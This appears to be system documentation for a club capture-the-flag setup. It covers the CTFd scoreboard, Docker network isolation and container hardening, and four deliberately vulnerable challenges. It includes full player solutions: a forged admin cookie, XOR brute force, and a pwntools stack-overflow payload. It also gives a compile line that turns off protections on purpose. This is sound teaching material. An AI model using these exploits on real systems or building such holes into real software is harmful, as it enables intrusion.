# CTF Environment — System Documentation

Complete reference for the club CTF: how the system is put together, how to run
it, how each challenge is exploited, and what the less-obvious commands actually
do. Read alongside `RUNBOOK.md` (which is the step-by-step *install* guide); this
document explains *how the thing works*.

> **Audience note.** Sections 1–4 are for everyone (organizers, admins,
> players). Sections 5–6 (exploit walkthroughs) are intended for players /
> learners. Section 7 explains the nuanced commands for anyone who wants to know
> *why* a line is written the way it is — not just that it works.

---

## 1. The big picture

There are two halves to this system, and keeping them separate is the entire
safety design.

1. **The platform** — CTFd, a web scoreboard where players register, read
   challenge descriptions, and submit flags. This is ordinary, trusted software.
2. **The challenges** — small programs that are *deliberately broken* so players
   can attack them and recover a hidden flag. This is untrusted, exploitable
   software by design.

These two halves run on **separate Docker networks** so that breaking a
challenge can never touch the scoreboard, the internet, or your real network.

```
                    Host LAN (your club subnet)
                              │
        ┌─────────────────────┼───────────────────────────┐
        │ published ports     │                            │
        │  :8000 (CTFd)       │  :9001 :9002 :9003 :9004    │
        │                     │  (one per challenge)        │
   ┌────┴─────┐         ┌─────┴──────────────────────────┐
   │ platform │         │ challenge_net (internal: true) │
   │ network  │         │  ── NO route to internet/LAN ──│
   │          │         │                                │
   │ ┌──────┐ │         │ ┌──────┐ ┌──────┐ ┌──────┐ ... │
   │ │ CTFd │ │         │ │ web  │ │ pwn  │ │crypto│      │
   │ └──┬───┘ │         │ └──────┘ └──────┘ └──────┘      │
   │ ┌──┴──┐  │         └────────────────────────────────┘
   │ │ db  │  │
   │ ├─────┤  │   db + cache are NOT published to the host;
   │ │cache│  │   only CTFd can reach them.
   │ └─────┘  │
   └──────────┘
```

The single most important line in the whole project lives in
`docker-compose.yml`:

```yaml
challenge_net:
  driver: bridge
  internal: true     # <-- removes the gateway; challenges can't reach out
```

`internal: true` strips the default gateway off that Docker network. Containers
on it can talk to each other and accept incoming connections that Docker
forwards from published ports, but they **cannot initiate outbound traffic** to
the internet or the rest of your LAN. So even a fully compromised challenge box
has nowhere to pivot to.

---

## 1a. Where Nix fits (and where it doesn't)

The project is named `ctf-flake` because it ships a Nix **flake**
(`flake.nix`), but it's worth being precise about how small Nix's role actually
is — most of this document doesn't mention it because most of the *running
system* doesn't involve it.

**What Nix does here:** it provides a reproducible *authoring* environment. When
a challenge author runs `nix develop`, the flake's lockfile pins the exact
versions of the build/exploit tools — `gcc`, `gdb`, `pwntools`, `socat`,
`binutils`, etc. — so everyone gets a byte-identical toolchain regardless of
what their own machine has installed. That matters most for **pwn/reversing**
challenges, where the precise compiler and libc affect whether an exploit's
offsets line up. It's the difference between "works on my laptop" and "works on
everyone's."

**What Nix does NOT do here:** it does not run, manage, or isolate any of the
live services. On this Ubuntu host, Nix is *not* managing the operating system
(that would be NixOS, a different thing). CTFd, the database, the cache, and the
challenges are all started and isolated by **Docker Compose** — not Nix. The
network isolation, the read-only filesystems, the firewall: none of that is
Nix's doing. So you can operate, exploit, and reset this entire system without
ever touching Nix; `nix develop` is a convenience for the people *building*
challenges, not a requirement for *running* them.

In short: **Nix = reproducible build/authoring toolchain. Docker = the running
system and its isolation.** If your club already lives in Docker and nobody uses
Nix, you could drop the flake entirely and bake the same tools into a Docker
"authoring image" instead — the rest of this document would be unchanged.

**Beyond authoring, the flake also ships role-based toolkits** so red and blue
teamers (and players) can drop into a complete, version-pinned tool environment
with one command — `nix develop .#red`, `.#blue`, or `.#player`. See
`TEAM-TOOLKITS.md` for the full tool lists and caveats. This is still Nix doing
its one job well — reproducible environments — just extended from "build tools"
to "operator tools."

| Stage              | Tool responsible | Shows up in this doc?        |
|--------------------|------------------|------------------------------|
| Authoring/building challenges | Nix (`nix develop`) | Only here + RUNBOOK §3 |
| Running services   | Docker Compose   | Throughout (§§1–6)            |
| Isolating services | Docker networks + host firewall | §1, §3, §7      |

---

## 2. The components, one by one

### CTFd (`ctfd` service)
The scoreboard web app (Flask/Python). Players hit it on port **8000**. It signs
session cookies with `SECRET_KEY`, stores data in MariaDB, and caches in Redis.
Pinned to version `3.8.2` (a recent release that fixed a root-user issue in the
stock compose file) and runs as its unprivileged user.

### MariaDB (`db` service)
CTFd's database — accounts, challenges, scores. It is on the `platform` network
**only** and is never published to the host, so nothing outside CTFd can reach
it.

### Redis (`cache` service)
CTFd's cache for sessions and config. Also `platform`-only, also unpublished.

### The four challenges
Each is built from `challenges/<name>/`, attaches **only** to `challenge_net`,
and is published on its own host port. Each runs with a hardening block (see
§3). They are intentionally vulnerable; they are *not* meant to be secure.

| Service              | Category  | Host port | Skill it teaches                        |
|----------------------|-----------|-----------|------------------------------------------|
| `web-cookie-monster` | web       | 9001      | Trusting client-controlled data for auth |
| `pwn-stackoverflow`  | pwn       | 9002      | Stack buffer overflow / return hijack    |
| `crypto-xor`         | crypto    | 9003      | Tiny-keyspace brute force                |
| `forensics-hidden`   | forensics | 9004      | Data appended after a file's real EOF    |

---

## 3. The per-challenge hardening, explained

Every challenge service carries this block. It limits the blast radius of an
exploited container — players can wreck their own session, never the host or
each other.

```yaml
read_only: true              # root filesystem is immutable
tmpfs: [ /tmp ]              # writable scratch that vanishes on restart
mem_limit: 256m              # can't eat all host RAM
pids_limit: 100              # can't fork-bomb the host
security_opt:
  - no-new-privileges:true   # a process can't gain more privs than it started with
cap_drop:
  - ALL                      # drop every Linux capability (no raw sockets, etc.)
```

What each does and *why it matters here*:

- **`read_only: true`** — the container's filesystem can't be modified. If a
  player gets code execution, they can't drop a persistent backdoor; a restart
  wipes everything back to pristine.
- **`tmpfs: [ /tmp ]`** — programs still need *somewhere* to write. `tmpfs` is a
  RAM-backed scratch directory that exists only while the container runs, so it
  satisfies that need without persisting anything.
- **`mem_limit` / `pids_limit`** — hard caps so a runaway or malicious process
  can't starve the host of memory or process slots (a denial-of-service against
  the whole event).
- **`no-new-privileges:true`** — blocks privilege-escalation tricks where a
  process would otherwise gain rights mid-execution (e.g. via setuid binaries).
- **`cap_drop: ALL`** — Linux "capabilities" are fine-grained root powers
  (binding low ports, raw network access, etc.). We drop them all; a challenge
  needs none of them, and removing them closes whole categories of escape.

Combined with `challenge_net`'s `internal: true`, the model is: *let players
fully own the inside of a challenge box, while ensuring that ownership buys them
nothing outside it.*

---

## 4. Running and operating the system

```bash
docker compose build          # turn each challenge's source into a runnable image
docker compose up -d           # start everything in the background (-d = detached)
docker compose ps              # list containers + health
docker compose logs -f ctfd    # follow CTFd's live logs (-f = follow/stream)
docker compose restart pwn-stackoverflow   # reset one challenge to pristine state
docker compose down            # stop and remove containers (keeps data volumes)
docker compose down -v         # also delete volumes (wipes CTFd's DB + uploads)
```

Then browse to `http://<server-LAN-ip>:8000`, finish CTFd's admin setup, and add
each challenge in the admin UI with its flag, category, and point value.

---

## 5. How each challenge works internally (organizer view)

### web-cookie-monster
A tiny Flask app reads a `role` cookie. If `role == admin`, it returns the flag.
The cookie is plain, client-set, and unsigned — so the client fully controls it.
**The lesson:** authorization must never trust client-controlled state; real
apps use server-signed sessions.

### pwn-stackoverflow
A C program reads input into a 64-byte stack buffer with `gets()`, which has no
bounds checking. There's an unused `win()` function that prints the flag.
Compiled with protections deliberately off (no stack canary, no PIE) so the
teaching point is the bug itself. Exposed over the network by `socat`, which
forks a fresh process per connection.
**The lesson:** unbounded input lets an attacker overwrite the saved return
address and redirect execution.

### crypto-xor
A Flask app XORs the flag against a single byte and serves the hex. With only
256 possible keys, brute force is instant.
**The lesson:** a key small enough to brute-force isn't encryption.

### forensics-hidden
A build step appends the flag *after* the end of a valid PNG file, then serves
the file. Image viewers stop at the PNG's real end and never show it; the bytes
are still in the file.
**The lesson:** "looks like an image" ≠ "contains only an image"; inspect raw
bytes.

---

## 6. Exploit walkthroughs (player view)

> These are full solutions. If you're a player meant to solve them yourself,
> stop reading. Organizers: keep this section out of any copy you hand players.

### 6.1 web-cookie-monster (port 9001)

The server believes whatever `role` cookie you send. Send `role=admin`:

```bash
curl -b "role=admin" http://<ip>:9001/
```

`-b` sets a request cookie. The page returns the flag. (In a browser you'd use
dev-tools → Application → Cookies to set `role=admin` and reload.)

### 6.2 crypto-xor (port 9003)

Grab the hex, then try all 256 single-byte keys until the result starts with
`CTF{`:

```bash
# fetch the ciphertext hex shown on the page, then:
python3 - <<'PY'
ct = bytes.fromhex("PASTE_THE_HEX_HERE")
for k in range(256):
    pt = bytes(b ^ k for b in ct)
    if pt.startswith(b"CTF{"):
        print(k, pt.decode()); break
PY
```

### 6.3 forensics-hidden (port 9004)

Download the file and look at its raw bytes — the flag is plain text after the
image data:

```bash
curl -s http://<ip>:9004/vacation.png -o vacation.png
strings vacation.png | grep CTF      # `strings` prints printable runs from a binary
# or: binwalk vacation.png           # detects/extracts appended data
```

### 6.4 pwn-stackoverflow (port 9002)

The buffer is 64 bytes; after it sits the saved base pointer (8 bytes), then the
saved **return address**. Overflow past the buffer + saved pointer (72 bytes
total) and overwrite the return address with the address of `win()`.

```bash
# Find win()'s address from the binary:
objdump -d vuln | grep '<win>:'      # e.g. 0x4011f6

python3 - <<'PY'
from pwn import *                      # pwntools: scripting exploits
context.arch = "amd64"
io = remote("<ip>", 9002)
payload = b"A"*72 + p64(0x4011f6)      # 72 bytes padding + little-endian win() addr
io.sendline(payload)
print(io.recvall().decode(errors="replace"))
PY
```

`p64(...)` packs the address into 8 little-endian bytes (how x86-64 stores
addresses in memory). The 72 comes from `buffer(64) + saved RBP(8)`.

---

## 7. The nuanced commands, explained

These are the lines that look cryptic. Here's what each piece is doing and why.

### 7.0 `nix develop`
```bash
nix develop
```
Reads `flake.nix`, resolves the exact pinned versions of the authoring tools
from the flake's lockfile, and drops you into a shell where those tools are on
your `PATH`. Leave the shell and they're gone again — nothing is installed
globally. It's the one Nix command you'll touch, and it's optional: it only
matters when *building* challenges, not when running the stack. See §1a for the
full scope of what Nix does and doesn't do here.

### 7.1 The pwn compile line
```bash
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
```
- **`-fno-stack-protector`** — turns OFF the "stack canary," a guard value the
  compiler normally places before the return address to detect overflows. We
  disable it so the overflow works and the *bug* is the lesson, not bypassing
  mitigations.
- **`-z execstack`** — marks the stack as executable. Not strictly needed for
  the win()-redirect solution, but it keeps the binary friendly to classic
  shellcode approaches for learners who go further.
- **`-no-pie`** — disables Position-Independent Executable. With PIE off, the
  program loads at a fixed address every run, so `win()` is at the *same*
  address each time and you don't have to defeat address randomization. Again:
  keeps the focus on the core concept.
- **`-o vuln`** — names the output file `vuln`.

### 7.2 The socat service line
```bash
socat -T60 TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/ctf/vuln,stderr
```
`socat` glues two data streams together. Here it bridges a TCP socket to a
program's stdin/stdout, turning a local program into a network service:
- **`-T60`** — idle timeout; drop a connection after 60s of inactivity so
  abandoned sessions don't pile up.
- **`TCP-LISTEN:9999`** — listen for TCP connections on port 9999.
- **`reuseaddr`** — lets the listener rebind the port immediately after restart
  instead of waiting for the OS's lingering-socket timeout.
- **`fork`** — **the important one.** For each incoming connection, fork a brand
  new child process. So every player gets their *own* fresh instance of `vuln`;
  one player crashing or popping a shell can't affect anyone else's session, and
  there's no shared persistent state to corrupt.
- **`EXEC:/home/ctf/vuln,stderr`** — run that binary for the connection and also
  wire its stderr to the socket (so error output is visible to the player).

### 7.3 The Dockerfile multi-stage build
```dockerfile
FROM debian:bookworm-slim AS build
... compile vuln ...
FROM debian:bookworm-slim
COPY --from=build /src/vuln /home/ctf/vuln
```
Two `FROM` lines = a **multi-stage build**. The first stage installs `gcc` and
compiles the binary. The second, final stage starts clean and copies *only* the
finished binary out of the build stage with `COPY --from=build`. Result: the
shipped image contains the binary and `socat` but **not** the compiler or source
— smaller, and less for a player who escapes to rummage through.

### 7.4 The chmod lines
```dockerfile
RUN chmod 0444 /home/ctf/flag.txt && chmod 0555 /home/ctf/vuln
```
Octal Unix permissions, three digits = owner / group / others:
- **`0444`** = read-only for everyone (`r--r--r--`). The flag can be read by the
  running program but not modified.
- **`0555`** = read + execute for everyone, no write (`r-xr-xr-x`). The binary
  can be run but not altered.

### 7.5 The secret generator
```bash
head -c 64 /dev/urandom | base64 | tr -d '\n'
```
- **`/dev/urandom`** — the kernel's cryptographically-secure random source.
- **`head -c 64`** — take exactly 64 random bytes from it.
- **`base64`** — encode those raw bytes as safe printable text.
- **`tr -d '\n'`** — strip newlines so the value sits on one line in `.env`.

This produces a strong, unpredictable `SECRET_KEY` — important because CTFd uses
it to sign session cookies; a weak or shared key would let players forge admin
sessions (exactly the bug `web-cookie-monster` teaches, but for real).

### 7.6 The isolation verification
```bash
docker compose exec crypto-xor sh -c \
  "wget -T3 -qO- http://example.com || echo 'BLOCKED (correct)'"
```
- **`docker compose exec crypto-xor sh -c "..."`** — run a shell command
  *inside* the already-running `crypto-xor` container.
- **`wget -T3 -qO-`** — try to fetch a URL: `-T3` 3-second timeout, `-q` quiet,
  `-O-` write to stdout.
- **`|| echo 'BLOCKED (correct)'`** — `||` runs the right side only if the left
  side **fails**. Since the challenge network is `internal`, the fetch *should*
  fail, so you should see `BLOCKED (correct)`. If you instead see page content,
  the isolation is broken and you must fix it before the event.

### 7.7 The firewall scoping
```bash
sudo ufw allow from 192.168.50.0/24 to any port 8000 proto tcp
```
- **`from 192.168.50.0/24`** — only allow connections originating from that
  subnet (your club LAN). The `/24` is CIDR notation for "the first 24 bits are
  the network," i.e. addresses `192.168.50.0`–`192.168.50.255`.
- **`to any port 8000 proto tcp`** — to any local address, TCP port 8000 (CTFd).

Scoping `from` a subnet means even if the box were somehow reachable elsewhere,
only your club network can connect.

---

## 8. Quick reference: where the flags live

| Challenge            | Flag location in source                    |
|----------------------|--------------------------------------------|
| web-cookie-monster   | `app.py`, `FLAG = ...`                      |
| pwn-stackoverflow    | `flag.txt` (baked into the image)           |
| crypto-xor           | `app.py`, `FLAG = ...` (served XOR-encoded)  |
| forensics-hidden     | `gen.py`, appended to `vacation.png`         |

Copy each flag into CTFd's admin UI when you create the challenge entry. Players
never see these files; they only reach the running services on ports 9001–9004.
